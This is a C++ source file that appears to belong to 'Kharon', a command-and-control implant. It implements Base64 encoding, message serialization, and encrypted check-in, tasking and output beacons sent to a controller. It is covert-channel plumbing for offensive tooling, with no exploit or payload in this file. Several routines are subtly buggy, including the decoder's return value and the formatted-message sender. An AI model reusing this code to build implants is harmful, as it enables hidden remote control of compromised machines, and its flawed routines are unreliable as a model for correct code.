#include <Kharon.h>

using namespace Root;

auto DECLFN B64Size(
    _In_ SIZE_T inlen
) -> SIZE_T {
    if (inlen == 0) return 0;
    
    SIZE_T padding = (inlen % 3) ? (3 - (inlen % 3)) : 0;
    
    if (inlen > (SIZE_MAX - padding) / 4 * 3) {
        return 0;
    }
    
    return ((inlen + padding) / 3) * 4;
}

auto DECLFN B64Size(
    _In_ const CHAR* Input
) -> SIZE_T {
    SIZE_T len;
    SIZE_T ret;
    SIZE_T i;

    if ( Input == nullptr )
    return 0;

    len = Str::LengthA( Input );
    ret = len / 4 * 3;

    for ( i = len; i-- > 0; ) {
        if ( Input[i] == '=')
        {
            ret--;
        }
        else {
            break;
        }
    }

    return ret;
}

auto DECLFN B64Enc(
    _In_ CHAR*  Input, 
    _In_ SIZE_T Length
) -> CHAR* {
    G_KHARON

    INT Base64Invs[80] = { 
        62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58,
        59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5,
        6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
        21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28,
        29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42,
        43, 44, 45, 46, 47, 48, 49, 50, 51 
    };
    
    const char B64Char[65] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    
    if ( Input == nullptr || Length == 0) return NULL;
    
    if ( Length > SIZE_MAX - 3) return NULL;
    
    SIZE_T elen = B64Size( Length );
    if (elen == 0) return NULL;
    
    char* out = (CHAR*)hAlloc( elen + 1 );
    if (!out) return NULL;
    
    out[elen] = '\0'; 
    
    SIZE_T i, j;
    for (i = 0, j = 0; i < Length; i += 3, j += 4) {
        UINT32 v = Input[i];
        v = (i + 1 < Length) ? (v << 8) | Input[i + 1] : v << 8;
        v = (i + 2 < Length) ? (v << 8) | Input[i + 2] : v << 8;
        
        out[j]     = B64Char[(v >> 18) & 0x3F];
        out[j + 1] = B64Char[(v >> 12) & 0x3F];
        
        if ( i + 1 < Length ) {
            out[j + 2] = B64Char[(v >> 6) & 0x3F];
        } else {
            out[j + 2] = '=';
        }
        
        if ( i + 2 < Length ) {
            out[j + 3] = B64Char[v & 0x3F];
        } else {
            out[j + 3] = '=';
        }
    }
    
    return out;
}

auto DECLFN B64IsValid( CHAR ch ) -> INT {
    if (ch >= '0' && ch <= '9') return 1;
    if (ch >= 'A' && ch <= 'Z') return 1;
    if (ch >= 'a' && ch <= 'z') return 1;
    if (ch == '+' || ch == '/') return 1;
    if (ch == '=') return 1; 
    return 0;
}

auto DECLFN B64Dec(
    CHAR* Input, 
    CHAR* Output, 
    INT32 OutputSize
) -> ULONG {
    static const unsigned char decode_table[] = {
        0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
        0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
        0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0, 62,  0,  0,  0, 63,
        52, 53, 54, 55, 56, 57, 58, 59, 60, 61,  0,  0,  0,  0,  0,  0,
        0,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
        15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25,  0,  0,  0,  0,  0,
        0, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
        41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51,  0,  0,  0,  0,  0
    };

    unsigned int input_len = 0;
    while ( Input[input_len] != '\0') input_len++;

    if (input_len % 4 != 0) return 0;

    unsigned int output_len = input_len / 4 * 3;
    if ( Input[input_len - 1] == '=' ) output_len--;
    if ( Input[input_len - 2] == '=' ) output_len--;

    if ( output_len > OutputSize ) return 0;

    unsigned int i = 0, j = 0;
    while (i < input_len) {
        unsigned char a = Input[i]   == '=' ? 0 : decode_table[(unsigned char)Input[i]];
        unsigned char b = Input[i+1] == '=' ? 0 : decode_table[(unsigned char)Input[i+1]];
        unsigned char c = Input[i+2] == '=' ? 0 : decode_table[(unsigned char)Input[i+2]];
        unsigned char d = Input[i+3] == '=' ? 0 : decode_table[(unsigned char)Input[i+3]];

        // Converte para 3 bytes
        Output[j++] = (a << 2) | ((b & 0x30) >> 4);
        if ( Input[i+2] != '=' )
            Output[j++] = ((b & 0x0F) << 4) | ((c & 0x3C) >> 2);
        if ( Input[i+3] != '=' )
            Output[j++] = ((c & 0x03) << 6) | d;

        i += 4;
    }

    return OutputSize;
}

auto DECLFN Int64ToBuffer( 
    _In_ PUCHAR Buffer, 
    _In_ UINT64 Value 
) -> VOID {
    Buffer[ 7 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 6 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 5 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 4 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 3 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 2 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 1 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 0 ] = Value & 0xFF;
}

auto DECLFN Int32ToBuffer( 
    _In_ PUCHAR Buffer, 
    _In_ UINT32 Size 
) -> VOID {
    ( Buffer ) [ 0 ] = ( Size >> 24 ) & 0xFF;
    ( Buffer ) [ 1 ] = ( Size >> 16 ) & 0xFF;
    ( Buffer ) [ 2 ] = ( Size >> 8  ) & 0xFF;
    ( Buffer ) [ 3 ] = ( Size       ) & 0xFF;
}

auto DECLFN Int16ToBuffer(
    _In_ PUCHAR Buffer,
    _In_ UINT16 Value
) -> VOID {
    Buffer[1] = Value & 0xFF; 
    Value >>= 8;
    Buffer[0] = Value & 0xFF;
}

auto DECLFN Int8ToBuffer(
    _In_ PUCHAR Buffer,
    _In_ UINT8 Value
) -> VOID {
    Buffer[0] = Value & 0xFF;
}

auto DECLFN Package::Int16( 
    _In_ PPACKAGE Package, 
    _In_ INT16    dataInt 
) -> VOID {
    Package->Buffer = PTR( hReAlloc( Package->Buffer, Package->Length + sizeof( INT16 ) ) );

    Int16ToBuffer( UC_PTR( Package->Buffer ) + Package->Length, dataInt );

    Package->Size   =   Package->Length;
    Package->Length +=  sizeof( UINT16 );
}

auto DECLFN Package::Int32(  
    _In_ PPACKAGE Package, 
    _In_ INT32    dataInt 
) -> VOID {
    Package->Buffer = PTR( hReAlloc( Package->Buffer, Package->Length + sizeof( INT32 ) ) );

    Int32ToBuffer( UC_PTR( Package->Buffer ) + Package->Length, dataInt );

    Package->Size   =   Package->Length;
    Package->Length +=  sizeof( INT32 );
}

auto DECLFN Package::Int64( 
    _In_ PPACKAGE Package, 
    _In_ INT64    dataInt 
) -> VOID {
    Package->Buffer = PTR( hReAlloc(
        Package->Buffer,
        Package->Length + sizeof( INT64 )
    ));

    Int64ToBuffer( UC_PTR( Package->Buffer ) + Package->Length, dataInt );

    Package->Size   =  Package->Length;
    Package->Length += sizeof( INT64 );
}

auto DECLFN Package::Create( 
    _In_ ULONG CommandID,
    _In_ PCHAR UUID
) -> PPACKAGE {
    PACKAGE* Package = NULL;

    Package         = (PACKAGE*)hAlloc( sizeof( PACKAGE ) );
    Package->Buffer = hAlloc( sizeof( BYTE ) );
    Package->Length = 0;

    this->Bytes( Package, UC_PTR( UUID ), 36 );
    this->Int16( Package, CommandID );

    Package->TaskUUID = UUID;

    return Package;
}

auto DECLFN Package::Checkin( VOID ) -> PACKAGE* {
    PACKAGE* Package = NULL;

    Package          = (PPACKAGE)hAlloc( sizeof( PACKAGE ) );
    Package->Buffer  = hAlloc( sizeof( BYTE ) );
    Package->Length  = 0;
    Package->Encrypt = FALSE;

    this->Pad( Package, UC_PTR( Self->Session.AgentID ), 36 );
    this->Byte( Package, Enm::Task::Checkin );

    return Package;
}

auto DECLFN Package::PostJobs( VOID ) -> PACKAGE* {
    PACKAGE* Package = NULL;

    Package          = (PACKAGE*)hAlloc( sizeof( PACKAGE ) );
    Package->Buffer  = PTR( hAlloc( sizeof( BYTE ) ) );
    Package->Length  = 0;
    Package->Encrypt = FALSE;

    this->Pad( Package, UC_PTR( Self->Session.AgentID ), 36 );
    this->Byte( Package, Enm::Task::PostReq );

    return Package;
}

auto DECLFN Package::NewTask( 
    VOID
) -> PPACKAGE {
    PPACKAGE Package = nullptr;

    Package          = (PPACKAGE)hAlloc( sizeof( PACKAGE ) );
    Package->Buffer  = PTR( hAlloc( sizeof( BYTE ) ) );
    Package->Length  = 0;
    Package->Encrypt = FALSE;

    this->Pad( Package, UC_PTR( Self->Session.AgentID ), 36 );
    this->Byte( Package, Enm::Task::GetTask );

    return Package;
}

auto DECLFN Package::Destroy( 
    _In_ PPACKAGE Package 
) -> VOID {
    if ( ! Package ) return;

    if ( Package->Buffer ) {
        hFree( Package->Buffer );
        Package->Buffer = nullptr;
        Package->Length = 0;
    }

    if ( Package ) {
        hFree( Package );
        Package = nullptr;
    }
    
    return;
}

auto DECLFN Package::Transmit( 
    PPACKAGE Package, 
    PVOID   *Response, 
    UINT64  *Size 
) -> BOOL {
    BOOL   Success       = FALSE;
    PVOID  Base64Buff    = nullptr;
    UINT64 Base64Size    = 0;
    PVOID  RetBuffer     = nullptr;
    UINT64 Retsize       = 0;

    ULONG EncryptOffset  = 36;
    ULONG PlainLen       = Package->Length - EncryptOffset;
    ULONG PaddedLen      = Self->Crp->CalcPadding(PlainLen);
    ULONG TotalPacketLen = EncryptOffset + PaddedLen;

    Package->Buffer = hReAlloc(Package->Buffer, TotalPacketLen);
    Package->Length = TotalPacketLen;

    PBYTE EncBuffer = (PBYTE)Self->Mm->Alloc(nullptr, TotalPacketLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if ( ! EncBuffer ) return FALSE;

    Mem::Copy( EncBuffer, Package->Buffer, EncryptOffset );

    Mem::Copy( EncBuffer + EncryptOffset, B_PTR( Package->Buffer ) + EncryptOffset, PlainLen );

    Self->Crp->AddPadding( EncBuffer + EncryptOffset, PlainLen, PaddedLen );
    Self->Crp->Encrypt( EncBuffer + EncryptOffset, PaddedLen );

    if ( ! Self->Session.Connected ) {
        if ( TotalPacketLen < sizeof( Self->Crp->LokKey ) ) {
            Self->Mm->Free( EncBuffer, 0, MEM_RELEASE );
            return FALSE;
        }

        Mem::Copy(
            EncBuffer + (TotalPacketLen - sizeof(Self->Crp->LokKey)),
            Self->Crp->LokKey,
            sizeof(Self->Crp->LokKey)
        );
    }

    PCHAR FinalPacket = B64Enc( A_PTR( EncBuffer ), TotalPacketLen );
    if ( ! FinalPacket ) {
        Self->Mm->Free( EncBuffer, 0, MEM_RELEASE );
        return FALSE;
    }

    UINT64 FinalPacketLen = this->Base64EncSize(TotalPacketLen);

    if ( Self->Tsp->Send( FinalPacket, FinalPacketLen, &Base64Buff, &Base64Size ) ) {
        Success = TRUE;
    }

    hFree( FinalPacket ); Self->Mm->Free( EncBuffer, 0, MEM_RELEASE );

    if ( Success && Base64Buff && Base64Size ) {
        Retsize   = B64Size( A_PTR( Base64Buff ) );
        RetBuffer = hAlloc( Retsize );
        if ( RetBuffer ) {
            B64Dec( A_PTR( Base64Buff ), A_PTR( RetBuffer ), Retsize );
            if (Response && Size) {
                CHAR*  DecBuff = A_PTR( U_PTR( RetBuffer ) + EncryptOffset );
                ULONG  DecLen  = Retsize - EncryptOffset;
                Self->Crp->Decrypt( B_PTR( DecBuff ), DecLen );
                *Response = RetBuffer; *Size = Retsize;
            } else {
                hFree( RetBuffer );
            }
        }
        if ( Base64Buff ) hFree( Base64Buff );
    }

    return Success;
}


auto DECLFN Package::Byte( 
    _In_ PPACKAGE Package, 
    _In_ BYTE     dataInt 
) -> VOID {
    Package->Buffer = hReAlloc( Package->Buffer, Package->Length + sizeof( BYTE ) );
    if ( !Package->Buffer ) { return; }

    ( B_PTR( Package->Buffer ) + Package->Length )[0] = dataInt;
    Package->Length += 1;

    return;
}

auto DECLFN Package::Pad( 
    _In_ PPACKAGE Package, 
    _In_ PUCHAR   Data, 
    _In_ SIZE_T   Size 
) -> VOID {
    Package->Buffer = A_PTR( hReAlloc(
        Package->Buffer,
        ( Package->Length + Size )
    ));

    Mem::Copy( PTR( U_PTR( Package->Buffer ) + ( Package->Length ) ), PTR( Data ), Size );

    Package->Size    = Package->Length;
    Package->Length += Size;
}

auto DECLFN Package::Bytes( 
    _In_ PPACKAGE Package, 
    _In_ PUCHAR   Data, 
    _In_ SIZE_T   Size 
) -> VOID {
    this->Int32( Package, Size );

    Package->Buffer = PTR( hReAlloc( Package->Buffer, Package->Length + Size ) );

    Int32ToBuffer( UC_PTR( U_PTR( Package->Buffer ) + ( Package->Length - sizeof( UINT32 ) ) ), Size );

    Mem::Copy( PTR( U_PTR( Package->Buffer ) + Package->Length ), PTR( Data ), Size );

    Package->Size   =   Package->Length;
    Package->Length +=  Size;
}

auto DECLFN Package::Str( 
    _In_ PPACKAGE package, 
    _In_ PCHAR    data 
) -> VOID {
    return this->Bytes( package, (BYTE*) data, Str::LengthA( data ) );
}

auto DECLFN Package::Wstr( 
    _In_ PPACKAGE package, 
    _In_ PWCHAR   data 
) -> VOID {
    return this->Bytes( package, (BYTE*) data, Str::LengthW( data ) * 2 );
}

auto DECLFN Package::SendOut(
    _In_ CHAR* UUID,
    _In_ ULONG CmdID,
    _In_ BYTE* Buffer,
    _In_ INT32 Length,
    _In_ ULONG Type
) -> BOOL {
    PACKAGE* Package = (PACKAGE*)hAlloc( sizeof( PACKAGE ) );

    Package->Buffer = PTR( hAlloc( sizeof( BYTE ) ) );
    Package->Length = 0;

    this->Pad( Package, UC_PTR( Self->Session.AgentID ), 36 );
    this->Byte( Package, Enm::Task::QuickOut );

    this->Pad( Package, (UCHAR*)UUID, 36 );
    this->Int32( Package, CmdID );
    this->Int32( Package, Type );
    this->Bytes( Package, Buffer, Length );

    BOOL result = this->Transmit( Package, nullptr, 0 );

    if ( Package ) this->Destroy( Package );

    return result;
}

auto DECLFN Package::FmtMsg(
    _In_ CHAR* UUID,
    _In_ ULONG Type,
    _In_ CHAR* Message,
    ...    
) -> BOOL {
    va_list VaList = { 0 };
    va_start( VaList, Message );

    BOOL  result   = 0;
    ULONG MsgSize  = 0;
    CHAR* MsgBuff  = nullptr;
    
    PACKAGE* Package = (PACKAGE*)hAlloc( sizeof( PACKAGE ) );

    MsgSize = Self->Msvcrt.vsnprintf( nullptr, 0, Message, VaList );
    if ( MsgSize < 0 ) {
        KhDbg( "failed get the formated message size" ); goto _KH_END;
    }

    MsgBuff = (CHAR*)hAlloc( MsgSize +1 );

    if ( Self->Msvcrt.vsnprintf( MsgBuff, MsgSize, Message, VaList ) < 0 ) {
        KhDbg( "failed formating string" ); goto _KH_END;
    }

    Package->Buffer = PTR( hAlloc( sizeof( BYTE ) ) );
    Package->Length = 0;

    this->Pad( Package, (PUCHAR)Self->Session.AgentID, 36 );
    this->Byte( Package, Enm::Task::QuickMsg );

    if ( PROFILE_C2 == PROFILE_SMB ) {
        // this->Pad( Package, (PUCHAR)SmbUUID, 36 );
    }

    this->Pad( Package, (UCHAR*)UUID, 36 );
    this->Int32( Package, Type );
    this->Str( Package, Message );

    result = this->Transmit( Package, nullptr, 0 );

_KH_END:
    if ( Package ) this->Destroy( Package );
    if ( VaList  ) va_end( VaList );
    if ( MsgBuff ) hFree( MsgBuff );

    return result;   
}

auto DECLFN Package::SendMsg(
    _In_ CHAR* UUID,
    _In_ CHAR* Message,
    _In_ ULONG Type
) -> BOOL {
    PACKAGE* Package = (PACKAGE*)hAlloc( sizeof( PACKAGE ) );

    Package->Buffer = PTR( hAlloc( sizeof( BYTE ) ) );
    Package->Length = 0;

    this->Pad( Package, (PUCHAR)Self->Session.AgentID, 36 );
    this->Byte( Package, Enm::Task::QuickMsg );

    if ( PROFILE_C2 == PROFILE_SMB ) {
        // this->Pad( Package, (PUCHAR)SmbUUID, 36 );
    }

    this->Pad( Package, (UCHAR*)UUID, 36 );
    this->Int32( Package, Type );
    this->Str( Package, Message );

    BOOL result = this->Transmit( Package, nullptr, 0 );

    if ( Package ) this->Destroy( Package );

    return result;
}

auto DECLFN Parser::New( 
    _In_ PPARSER parser, 
    _In_ PVOID   Buffer, 
    _In_ UINT64  size 
) -> VOID {
    if ( parser == NULL )
        return;

    parser->Original = A_PTR( hAlloc( size ) );
    Mem::Copy( PTR( parser->Original ), PTR( Buffer ), size );
    parser->Buffer   = parser->Original;
    parser->Length   = size;
    parser->Size     = size;
}

auto DECLFN Parser::NewTask( 
    _In_ PPARSER parser, 
    _In_ PVOID   Buffer, 
    _In_ UINT64  size 
) -> VOID {
    if ( parser == NULL )
        return;

    parser->Original = A_PTR( hAlloc( size ) );
    Mem::Copy( PTR( parser->Original ), PTR( Buffer ), size );
    parser->Buffer   = parser->Original;
    parser->Length   = size;
    parser->Size     = size;

    Self->Psr->Pad( parser, 36 );
}

auto DECLFN Parser::Pad(
    _In_  PPARSER parser,
    _Out_ ULONG size
) -> BYTE* {
    if (!parser)
        return NULL;

    if (parser->Length < size)
        return NULL;

    BYTE* padData = B_PTR(parser->Buffer);

    parser->Buffer += size;
    parser->Length -= size;

    return padData;
}

auto DECLFN Parser::Int32( 
    _In_ PPARSER parser 
) -> INT32 {
    INT32 intBytes = 0;

    // if ( parser->Length < 4 )
        // return 0;

    Mem::Copy( PTR( &intBytes ), PTR( parser->Buffer ), 4 );

    parser->Buffer += 4;
    parser->Length -= 4;

    if ( !this->Endian )
        return ( INT ) intBytes;
    else
        return ( INT ) __builtin_bswap32( intBytes );
}

auto DECLFN Parser::Bytes( 
    _In_ PPARSER parser, 
    _In_ ULONG*  size 
) -> BYTE* {
    UINT32  Length  = 0;
    BYTE*   outdata = NULL;

    if ( parser->Length < 4 || !parser->Buffer )
        return NULL;

    Mem::Copy( PTR( &Length ), PTR( parser->Buffer ), 4 );
    parser->Buffer += 4;

    if ( this->Endian )
        Length = __builtin_bswap32( Length );

    outdata = B_PTR( parser->Buffer );
    if ( outdata == NULL )
        return NULL;

    parser->Length -= 4;
    parser->Length -= Length;
    parser->Buffer += Length;

    if ( size != NULL )
        *size = Length;

    return outdata;
}

auto DECLFN Parser::Destroy( 
    _In_ PPARSER Parser 
) -> BOOL {
    if ( ! Parser ) return FALSE;

    BOOL Success = TRUE;

    if ( Parser->Original ) {
        Success = hFree( Parser->Original );
        Parser->Original = nullptr;
        Parser->Length   = 0;
    }

    if ( Parser ) {
        Success = hFree( Parser );
        Parser = nullptr;
    }

    return Success;
}

auto DECLFN Parser::Str( 
    _In_ PPARSER parser, 
    _In_ ULONG* size 
) -> PCHAR {
    return ( PCHAR ) Self->Psr->Bytes( parser, size );
}

auto DECLFN Parser::Wstr( 
    _In_ PPARSER parser, 
    _In_ ULONG*  size 
) -> PWCHAR {
     return ( PWCHAR )Self->Psr->Bytes( parser, size );
}
auto DECLFN Parser::Int16( 
    _In_ PPARSER parser
) -> INT16 {
    INT16 intBytes = 0;

    if ( parser->Length < 2 )
        return 0;

    Mem::Copy( PTR( &intBytes ), PTR( parser->Buffer ), 2 );

    parser->Buffer += 2;
    parser->Length -= 2;

    if ( !this->Endian ) 
        return intBytes;
    else 
        return __builtin_bswap16( intBytes ) ;
}

auto DECLFN Parser::Int64( 
    _In_ PPARSER parser 
) -> INT64 {
    INT64 intBytes = 0;

    if ( ! parser )
        return 0;

    if ( parser->Length < 8 )
        return 0;

    Mem::Copy( PTR( &intBytes ), PTR( parser->Buffer ), 8 );

    parser->Buffer += 8;
    parser->Length -= 8;

    if ( !this->Endian )
        return ( INT64 ) intBytes;
    else
        return ( INT64 ) __builtin_bswap64( intBytes );
}

auto DECLFN Parser::Byte( 
    _In_ PPARSER parser 
) -> BYTE {
    BYTE intBytes = 0;

    if ( parser->Length < 1 )
        return 0;

    Mem::Copy( PTR( &intBytes ), PTR( parser->Buffer ), 1 );

    parser->Buffer += 1;
    parser->Length -= 1;

    return intBytes;
}